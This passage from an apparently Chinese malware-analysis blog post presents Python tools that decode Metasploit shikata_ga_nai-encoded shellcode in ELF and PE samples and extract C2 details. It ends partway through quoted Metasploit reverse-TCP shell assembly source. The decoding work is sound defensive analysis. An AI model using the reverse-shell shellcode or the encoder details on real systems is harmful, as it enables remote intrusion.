<p>加密轮次信息可以通过ecx这个寄存器来提取，源码中关于长度的算法如下：<br><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line">		length += <span class="number">4</span> + (<span class="number">4</span> - (length &amp; <span class="number">3</span>)) &amp; <span class="number">3</span></span><br><span class="line">    length /= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (length &lt;= <span class="number">255</span>)</span><br><span class="line">      init_counter.add_perm(<span class="string">&quot;\xb1&quot;</span> + [ length ].pack(<span class="string">&#x27;C&#x27;</span>))</span><br><span class="line">    <span class="keyword">elsif</span> (length &lt;= <span class="number">65536</span>)</span><br><span class="line">      init_counter.add_perm(<span class="string">&quot;\x66\xb9&quot;</span> + [ length ].pack(<span class="string">&#x27;v&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      init_counter.add_perm(<span class="string">&quot;\xb9&quot;</span> + [ length ].pack(<span class="string">&#x27;V&#x27;</span>))</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
<p>已知多一次，shellcode长度会增加27，迭代次数可以通过如下方法计算：</p>
<script type="math/tex; mode=display">iteration = \lfloor\frac{(SIZE_{ELF} - SIZE_{BASE})}{27}\rfloor + 1</script><p>其中，$SIZE_{BASE}$的值是第一轮时恶意样本的代码长度，在x86下迭代1轮时，输出为ELF文件时其size为150，输出为PE文件时其size为381。</p>
<p>那么可以根据这个情况去求解迭代轮数，从而完善解密脚本。</p>
<p><img src="https://s2.loli.net/2024/01/29/8VNXZdPsD93qwha.png" alt=""></p>
<p>贴一些核心代码，指令集分析机：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> Cs, CS_ARCH_X86, CS_MODE_32, CS_MODE_64</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InstructionSet</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将基本block的指令转为字符串存储</span></span><br><span class="line"><span class="string">    数据类型如下：</span></span><br><span class="line"><span class="string">    &#123;address:[&#x27;mov&#x27;,&#x27;ebx&#x27;,&#x27;0ACAABAECh&#x27;]&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, start_address, arch</span>):</span></span><br><span class="line">        self.instructions = &#123;&#125;</span><br><span class="line">        self.start_address = start_address</span><br><span class="line">        <span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">            self.md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">        <span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">            self.md = Cs(CS_ARCH_X86, CS_MODE_32)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_instructions</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 获取当前指令集</span></span><br><span class="line">        <span class="keyword">return</span> self.instructions</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_instruction</span>(<span class="params">self, address, data</span>):</span></span><br><span class="line">        <span class="comment"># 设置指令</span></span><br><span class="line">        self.instructions[address] = data</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_instructions</span>(<span class="params">self, code</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        根据传入的字节数据转为反汇编。</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            code (str): 指令的字节码</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> instruction <span class="keyword">in</span> self.md.disasm(code, self.start_address):</span><br><span class="line">            mnemonic = instruction.mnemonic</span><br><span class="line">            op_str = instruction.op_str</span><br><span class="line">            op_str = op_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            op_str = [i.lstrip().rstrip() <span class="keyword">for</span> i <span class="keyword">in</span> op_str]  <span class="comment"># 去除空格</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(op_str) == <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># 只有一个操作数</span></span><br><span class="line">                op_str1 = op_str[<span class="number">0</span>]</span><br><span class="line">                op_str2 = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(op_str) == <span class="number">2</span>:</span><br><span class="line">                op_str1 = op_str[<span class="number">0</span>]</span><br><span class="line">                op_str2 = op_str[<span class="number">1</span>]</span><br><span class="line">            self.instructions[instruction.address] = [mnemonic, op_str1, op_str2]</span><br><span class="line">        </span><br><span class="line">        self.instructions = OrderedDict(<span class="built_in">sorted</span>(self.instructions.iteritems(), key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&#x27;---------- generate instrction success ----------&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove_pre_basic_block</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        移除之前加密的基本块。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            remove_number (int): 移除轮数</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        target_list = [<span class="string">u&#x27;fnstenv&#x27;</span>, <span class="string">u&#x27;dword ptr [esp - 0xc]&#x27;</span>, <span class="literal">None</span>]</span><br><span class="line">        <span class="comment"># 统计出现了多少次fnstenv指令</span></span><br><span class="line">        remove_number = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> value <span class="keyword">in</span> self.instructions.values() <span class="keyword">if</span> value == target_list) - <span class="number">1</span></span><br><span class="line">        print(<span class="string">&#x27;remove:&#x27;</span>, remove_number)</span><br><span class="line">        <span class="keyword">if</span> remove_number &gt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">sorted</span>(self.instructions.keys()):</span><br><span class="line">                <span class="keyword">if</span> key &gt;= self.start_address <span class="keyword">and</span> key &lt; self.start_address + <span class="number">27</span> * remove_number:</span><br><span class="line">                    <span class="keyword">del</span> self.instructions[key]</span><br><span class="line">            </span><br><span class="line">            base = <span class="built_in">sorted</span>(self.instructions.keys())[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">sorted</span>(self.instructions.keys()):</span><br><span class="line">                <span class="keyword">if</span> key &gt;= base + <span class="number">27</span>:</span><br><span class="line">                    <span class="keyword">del</span> self.instructions[key]</span><br></pre></td></tr></table></figure></p>
<p>内存模拟机：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    基本内存类</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, bytes_data, base_address</span>):</span></span><br><span class="line">        self.data = bytes_data</span><br><span class="line">        self.base_address = base_address</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_4_bytes_from_address</span>(<span class="params">self, address</span>):</span></span><br><span class="line">        <span class="comment"># 从给定偏移处获取4字节</span></span><br><span class="line">        offset = address - self.base_address</span><br><span class="line">        <span class="keyword">return</span> u32(self.data[offset: offset + <span class="number">4</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_4_bytes_from_address</span>(<span class="params">self, address, write_data</span>):</span></span><br><span class="line">        offset = address - self.base_address</span><br><span class="line">        part1 = self.data[ :offset]</span><br><span class="line">        part2 = p32(write_data)</span><br><span class="line">        part3 = self.data[offset + <span class="number">4</span>: ]</span><br><span class="line"></span><br><span class="line">        self.data = part1 + part2 + part3</span><br></pre></td></tr></table></figure></p>
<p>解码器函数：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_smc</span>(<span class="params">data, elf, bytes_code</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        解开shikata_ga_nai加密的函数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            data (dict): InstructionSet类中的instructions成员。</span></span><br><span class="line"><span class="string">            elf (ELF): 打开的ELF对象。</span></span><br><span class="line"><span class="string">            bytes_code (bytes): 恶意样本的字节码。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    xor_flag, secret_flag, base_flag, secret_key, <span class="built_in">round</span>, base_addr, xor_offset, secret_add_offset = parse_param(data, <span class="literal">False</span>)</span><br><span class="line">    mem = Memory(bytes_code, elf.entry)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 确定是否要进行二次解密</span></span><br><span class="line">    decode_basic_block = <span class="number">1</span> <span class="keyword">if</span> xor_flag == <span class="number">3</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">round</span>):</span><br><span class="line">        priority = <span class="built_in">sorted</span>([xor_flag, base_flag, secret_flag])</span><br><span class="line">        priority.reverse()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> flag <span class="keyword">in</span> priority:</span><br><span class="line">            <span class="keyword">if</span> flag == xor_flag:</span><br><span class="line">                unit = mem.get_4_bytes_from_address(base_addr + xor_offset)</span><br><span class="line">                result = unit ^ secret_key  <span class="comment"># 解密</span></span><br><span class="line">                mem.write_4_bytes_from_address(base_addr + xor_offset, result)</span><br><span class="line">                <span class="keyword">if</span> decode_basic_block:</span><br><span class="line">                    ins = InstructionSet(elf.entry, <span class="number">32</span>)</span><br><span class="line">                    ins.generate_instructions(mem.data)</span><br><span class="line">                    ins.remove_pre_basic_block()</span><br><span class="line">                    data = ins.get_instructions()</span><br><span class="line">                    decode_basic_block = <span class="number">0</span></span><br><span class="line">                    print(<span class="string">&#x27;二次更新:&#x27;</span>)</span><br><span class="line">                    [xor_flag, secret_flag, base_flag, tmp1, tmp2, tmp3, tmp4, secret_add_offset] = parse_param(data, <span class="literal">True</span>)</span><br><span class="line">               </span><br><span class="line">            <span class="keyword">elif</span> flag == base_flag:</span><br><span class="line">                base_addr += <span class="number">4</span>              <span class="comment"># 基址+4</span></span><br><span class="line">            <span class="keyword">elif</span> flag == secret_flag:</span><br><span class="line">                secret_key += mem.get_4_bytes_from_address(base_addr + secret_add_offset)</span><br><span class="line">                secret_key = secret_key &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> mem.data</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>参数分析器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_param</span>(<span class="params">data, only_offset</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        解析指令集数据的参数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            data (dict): 指令集类中的instructions</span></span><br><span class="line"><span class="string">            only_offset (bool): 是否是读取偏移相关参数</span></span><br><span class="line"><span class="string">        Return:</span></span><br><span class="line"><span class="string">            [xor_flag, secret_flag, base_flag, secret_key, round, base_addr, xor_offset, secret_add_offset]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 分清三个顺序，xor_flag表示异或在前，secret_flag表示密钥运算在前，base_flag表示基址运算在前</span></span><br><span class="line">    xor_flag = secret_flag = base_flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">sorted</span>(data.keys()):</span><br><span class="line">        value = data[key]</span><br><span class="line">        <span class="comment"># print(value)</span></span><br><span class="line">        <span class="keyword">if</span> value[<span class="number">0</span>] == <span class="string">&#x27;mov&#x27;</span> <span class="keyword">and</span> <span class="built_in">len</span>(value[<span class="number">2</span>]) == <span class="number">10</span> <span class="keyword">and</span> only_offset == <span class="literal">False</span>:</span><br><span class="line">            secret_key = <span class="built_in">int</span>(value[<span class="number">2</span>], base=<span class="number">16</span>) <span class="comment"># 获取密钥</span></span><br><span class="line">        <span class="keyword">if</span> value[<span class="number">0</span>] == <span class="string">&#x27;mov&#x27;</span> <span class="keyword">and</span> value[<span class="number">1</span>] == <span class="string">&#x27;cl&#x27;</span> <span class="keyword">and</span> only_offset == <span class="literal">False</span>:</span><br><span class="line">            <span class="built_in">round</span> = <span class="built_in">int</span>(value[<span class="number">2</span>], base=<span class="number">16</span>) <span class="comment"># 获取解密轮数</span></span><br><span class="line">        <span class="keyword">if</span> value[<span class="number">0</span>][<span class="number">0</span>] == <span class="string">&#x27;f&#x27;</span> <span class="keyword">and</span> value[<span class="number">0</span>] != <span class="string">&#x27;fnstenv&#x27;</span> <span class="keyword">and</span> only_offset == <span class="literal">False</span>:</span><br><span class="line">            base_addr = key <span class="comment"># 获取fnstenv的上一条浮点操作的指令地址</span></span><br><span class="line">        <span class="keyword">if</span> value[<span class="number">0</span>] == <span class="string">&#x27;xor&#x27;</span> <span class="keyword">and</span> <span class="built_in">len</span>(value[<span class="number">1</span>]) &gt; <span class="number">10</span>:</span><br><span class="line">            xor_offset = <span class="built_in">int</span>(value[<span class="number">1</span>].split(<span class="string">&#x27;+ &#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;]&#x27;</span>)[<span class="number">0</span>], base=<span class="number">16</span>) <span class="comment"># 获取偏移量: dword ptr [edi + 0x14]</span></span><br><span class="line">            <span class="keyword">if</span> secret_flag == <span class="number">0</span> <span class="keyword">and</span> base_flag == <span class="number">0</span>: </span><br><span class="line">                xor_flag = <span class="number">3</span>        <span class="comment"># xor解密顺序第一</span></span><br><span class="line">            <span class="keyword">elif</span> secret_flag + base_flag == <span class="number">3</span>:</span><br><span class="line">                xor_flag = <span class="number">2</span>        <span class="comment"># xor解密顺序第二</span></span><br><span class="line">            <span class="keyword">elif</span> secret_flag + base_flag == <span class="number">5</span>:</span><br><span class="line">                xor_flag = <span class="number">1</span>        <span class="comment"># xor解密顺序第三</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> (value[<span class="number">0</span>] == <span class="string">&#x27;add&#x27;</span> <span class="keyword">or</span> value[<span class="number">0</span>] == <span class="string">&#x27;sub&#x27;</span>) <span class="keyword">and</span> (value[<span class="number">2</span>] == <span class="string">&#x27;4&#x27;</span> <span class="keyword">or</span> value[<span class="number">2</span>] == <span class="string">&#x27;-4&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> secret_flag == <span class="number">0</span> <span class="keyword">and</span> xor_flag == <span class="number">0</span>: </span><br><span class="line">                base_flag = <span class="number">3</span>        <span class="comment"># base运算顺序第一</span></span><br><span class="line">            <span class="keyword">elif</span> secret_flag + xor_flag == <span class="number">3</span>:</span><br><span class="line">                base_flag = <span class="number">2</span>        <span class="comment"># base运算顺序第二</span></span><br><span class="line">            <span class="keyword">elif</span> secret_flag + xor_flag == <span class="number">5</span>:</span><br><span class="line">                base_flag = <span class="number">1</span>        <span class="comment"># base运算顺序第三</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> value[<span class="number">0</span>] == <span class="string">&#x27;add&#x27;</span> <span class="keyword">and</span> <span class="built_in">len</span>(value[<span class="number">2</span>]) &gt; <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                secret_add_offset = <span class="built_in">int</span>(value[<span class="number">2</span>].split(<span class="string">&#x27;+ &#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;]&#x27;</span>)[<span class="number">0</span>], base=<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                secret_add_offset = xor_offset</span><br><span class="line">            <span class="keyword">if</span> base_flag == <span class="number">0</span> <span class="keyword">and</span> xor_flag == <span class="number">0</span>: </span><br><span class="line">                secret_flag = <span class="number">3</span>        <span class="comment"># 密钥运算顺序第一</span></span><br><span class="line">            <span class="keyword">elif</span> base_flag + xor_flag == <span class="number">3</span>:</span><br><span class="line">                secret_flag = <span class="number">2</span>        <span class="comment"># 密钥运算顺序第二</span></span><br><span class="line">            <span class="keyword">elif</span> base_flag + xor_flag == <span class="number">5</span>:</span><br><span class="line">                secret_flag = <span class="number">1</span>        <span class="comment"># 密钥运算顺序第三</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (value[<span class="number">0</span>] == <span class="string">&#x27;add&#x27;</span> <span class="keyword">and</span> value[<span class="number">1</span>] == value[<span class="number">2</span>]):</span><br><span class="line">            secret_add_offset = xor_offset</span><br><span class="line">            <span class="keyword">if</span> base_flag == <span class="number">0</span> <span class="keyword">and</span> xor_flag == <span class="number">0</span>: </span><br><span class="line">                secret_flag = <span class="number">3</span>        <span class="comment"># 密钥运算顺序第一</span></span><br><span class="line">            <span class="keyword">elif</span> base_flag + xor_flag == <span class="number">3</span>:</span><br><span class="line">                secret_flag = <span class="number">2</span>        <span class="comment"># 密钥运算顺序第二</span></span><br><span class="line">            <span class="keyword">elif</span> base_flag + xor_flag == <span class="number">5</span>:</span><br><span class="line">                secret_flag = <span class="number">1</span>        <span class="comment"># 密钥运算顺序第三</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> only_offset == <span class="literal">False</span>:</span><br><span class="line">        success(<span class="string">&#x27;base address:&#x27;</span> + <span class="built_in">hex</span>(base_addr))</span><br><span class="line">        success(<span class="string">&#x27;cl:&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">round</span>))</span><br><span class="line">        success(<span class="string">&#x27;secret key:&#x27;</span> + <span class="built_in">hex</span>(secret_key))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_addr = <span class="number">0</span></span><br><span class="line">        <span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">        secret_key = <span class="number">0</span></span><br><span class="line">    success(<span class="string">&#x27;add key offset:&#x27;</span> + <span class="built_in">hex</span>(secret_add_offset))</span><br><span class="line">    success(<span class="string">&#x27;xor offset:&#x27;</span> + <span class="built_in">hex</span>(xor_offset))</span><br><span class="line">    success(<span class="string">&#x27;xor_flag, base_flag, secret_flag:&#x27;</span> + <span class="built_in">str</span>(xor_flag) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(base_flag) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(secret_flag))</span><br><span class="line">    <span class="keyword">return</span> xor_flag, secret_flag, base_flag, secret_key, <span class="built_in">round</span>, base_addr, xor_offset, secret_add_offset</span><br></pre></td></tr></table></figure>
<p>解码成功：</p>
<p><img src="https://s2.loli.net/2024/01/30/jwdlsT9hCexQvW3.png" alt=""></p>
<h4 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h4><p>和x86下没有差别，用同一套解密思路即可。</p>
<p>同样可以解密成功。</p>
<p><img src="https://s2.loli.net/2024/01/30/eYHAo2QrhaPOzRs.png" alt=""></p>
<h3 id="PE样本"><a href="#PE样本" class="headerlink" title="PE样本"></a>PE样本</h3><p>首先是加密轮数的确定，由于msf生成出来的pe样本其体积比较大，充斥着除了payload以外的其余代码，所以无法根据恶意文件的体积确定加密轮数。</p>
<p>MSF中关于payload长度的算法如下：</p>
<p><img src="https://s2.loli.net/2023/11/17/8A7uQRq2gftdJBS.png" alt=""></p>
<p>那么我们只需要提取出来cl寄存器的值，然后乘以4得到近似shellcode的长度，由于我们异或是经过一定的偏移进行的，所以shellcode的具体长度肯定要大于我们乘以4得到的结果，找到最接近shellcode的长度对应的轮次即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">iteration_list = [i * <span class="number">27</span> + <span class="number">381</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(iteration_list)):</span><br><span class="line">    <span class="keyword">if</span> iteration_list[i] &gt; <span class="built_in">round</span> * <span class="number">4</span>:</span><br><span class="line">        iteration = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>整体思路同ELF，只不过比ELF提取多了一些步骤，首先要进行shellcode起始地址的确定，这个可以用capstone进行搜索，然后根据样本观察，在shellcode起始前总会有一个call指令，这个可以作为shellcode入口的一个特征码，核心处理代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_instructions_pe</span>(<span class="params">self, file_path</span>):</span></span><br><span class="line">    pe = pefile.PE(file_path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取代码节（.text）的内容</span></span><br><span class="line">    text_section = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> section <span class="keyword">in</span> pe.sections:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;.text&#x27;</span> <span class="keyword">in</span> section.Name:</span><br><span class="line">            text_section = section.get_data()</span><br><span class="line">    <span class="keyword">if</span> text_section <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        print(<span class="string">&quot;无法找到代码节（.text）&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    min_distance = <span class="number">65535</span></span><br><span class="line">    call = <span class="number">0</span></span><br><span class="line">    fnstenv = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 遍历节表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查找所有call指令的位置</span></span><br><span class="line">    call_offsets = [offset <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text_section)) <span class="keyword">if</span> text_section[offset:offset + <span class="number">1</span>] == <span class="string">b&#x27;\xE8&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> call_offset <span class="keyword">in</span> call_offsets:</span><br><span class="line">        <span class="comment"># 在call指令后查找fnstenv指令</span></span><br><span class="line">        fnstenv_offset = text_section.find(<span class="string">b&#x27;\xD9\x74\x24&#x27;</span>, call_offset)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> fnstenv_offset != -<span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 找到了call和fnstenv指令</span></span><br><span class="line">            <span class="keyword">if</span> fnstenv_offset - call_offset &lt; min_distance:</span><br><span class="line">                min_distance = fnstenv_offset - call_offset</span><br><span class="line">                call = call_offset</span><br><span class="line">                fnstenv = fnstenv_offset</span><br><span class="line"></span><br><span class="line">    bytes_code = text_section[call:]</span><br><span class="line"></span><br><span class="line">    md = Cs(CS_ARCH_X86, CS_MODE_32 <span class="keyword">if</span> pe.OPTIONAL_HEADER.Magic == <span class="number">0x10b</span> <span class="keyword">else</span> CS_MODE_64)</span><br><span class="line">    <span class="keyword">for</span> instruction <span class="keyword">in</span> md.disasm(bytes_code, <span class="number">0x401000</span> + call):</span><br><span class="line">        mnemonic = instruction.mnemonic</span><br><span class="line">        op_str = instruction.op_str</span><br><span class="line">        op_str = op_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        op_str = [i.lstrip().rstrip() <span class="keyword">for</span> i <span class="keyword">in</span> op_str]  <span class="comment"># 去除空格</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(op_str) == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 只有一个操作数</span></span><br><span class="line">            op_str1 = op_str[<span class="number">0</span>]</span><br><span class="line">            op_str2 = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(op_str) == <span class="number">2</span>:</span><br><span class="line">            op_str1 = op_str[<span class="number">0</span>]</span><br><span class="line">            op_str2 = op_str[<span class="number">1</span>]</span><br><span class="line">        self.instructions[instruction.address] = [mnemonic, op_str1, op_str2]</span><br><span class="line">    </span><br><span class="line">    del_first_flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">sorted</span>(self.instructions.keys()):</span><br><span class="line">        value = self.instructions[key]</span><br><span class="line">        <span class="keyword">if</span> del_first_flag:</span><br><span class="line">            <span class="keyword">del</span> self.instructions[key]</span><br><span class="line">            del_first_flag = <span class="literal">False</span></span><br><span class="line">            <span class="comment"># 获取第一条指令的地址作为基本块的地址</span></span><br><span class="line">            basic_block_address = <span class="built_in">list</span>(<span class="built_in">sorted</span>(self.instructions.items()))[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> key &gt; basic_block_address + <span class="number">27</span>:</span><br><span class="line">            <span class="keyword">del</span> self.instructions[key]</span><br><span class="line">    </span><br><span class="line">    self.instructions = OrderedDict(<span class="built_in">sorted</span>(self.instructions.iteritems(), key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>]))</span><br><span class="line">    <span class="comment"># 返回字节码</span></span><br><span class="line">    <span class="keyword">return</span> bytes_code[basic_block_address-<span class="number">0x401000</span>-call:]</span><br></pre></td></tr></table></figure>
<p>随后处理同ELF样本</p>
<h2 id="C2信息提取"><a href="#C2信息提取" class="headerlink" title="C2信息提取"></a>C2信息提取</h2><h3 id="PE样本-1"><a href="#PE样本-1" class="headerlink" title="PE样本"></a>PE样本</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><p>其中Reverse Shell的连接建立过程的汇编代码见：<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)</span><br><span class="line">; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4</span><br><span class="line">; Version: 1.0 (24 July 2009)</span><br><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">[BITS 32]</span><br><span class="line"></span><br><span class="line">; Input: EBP must be the address of &#39;api_call&#39;.</span><br><span class="line">; Output: EDI will be the socket for the connection to the server</span><br><span class="line">; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)</span><br><span class="line"></span><br><span class="line">reverse_tcp:</span><br><span class="line">  push 0x00003233        ; Push the bytes &#39;ws2_32&#39;,0,0 onto the stack.</span><br><span class="line">  push 0x5F327377        ; ...</span><br><span class="line">  push esp               ; Push a pointer to the &quot;ws2_32&quot; string on the stack.</span><br><span class="line">  push 0x0726774C        ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )</span><br><span class="line">  call ebp               ; LoadLibraryA( &quot;ws2_32&quot; )</span><br><span class="line">  </span><br><span class="line">  mov eax, 0x0190        ; EAX &#x3D; sizeof( struct WSAData )</span><br><span class="line">  sub esp, eax           ; alloc some space for the WSAData structure</span><br><span class="line">  push esp               ; push a pointer to this stuct</span><br><span class="line">  push eax               ; push the wVersionRequested parameter</span><br><span class="line">  push 0x006B8029        ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )</span><br><span class="line">  call ebp               ; WSAStartup( 0x0190, &amp;WSAData );</span><br><span class="line">  </span><br><span class="line">  push eax               ; if we succeed, eax wil be zero, push zero for the flags param.</span><br><span class="line">  push eax               ; push null for reserved parameter</span><br><span class="line">  push eax               ; we do not specify a WSAPROTOCOL_INFO structure</span><br><span class="line">  push eax               ; we do not specify a protocol</span><br><span class="line">  inc eax                ;</span><br><span class="line">  push eax               ; push SOCK_STREAM</span><br><span class="line">  inc eax                ;</span><br><span class="line">  push eax               ; push AF_INET</span><br><span class="line">  push 0xE0DF0FEA        ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )</span><br><span class="line">  call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span><br><span class="line">  xchg edi, eax          ; save the socket for later, don&#39;t care about the value of eax after this</span><br><span class="line"></span><br><span class="line">set_address:</span><br><span class="line">  push byte 0x05         ; retry counter</span><br><span class="line">  push 0x0100007F        ; host 127.0.0.1</span><br><span class="line">  push 0x5C110002        ; family AF_INET and port 4444</span><br><span class="line">  mov esi, esp           ; save pointer to sockaddr struct</span><br><span class="line">  </span><br><span class="line">try_connect:</span><br><span class="line">  push byte 16           ; length of the sockaddr struct</span><br><span class="line">  push esi               ; pointer to the sockaddr struct</span><br><span class="line">  push edi               ; the socket</span><br><span class="line">  push 0x6174A599        ; hash( &quot;ws2_32.dll&quot;, 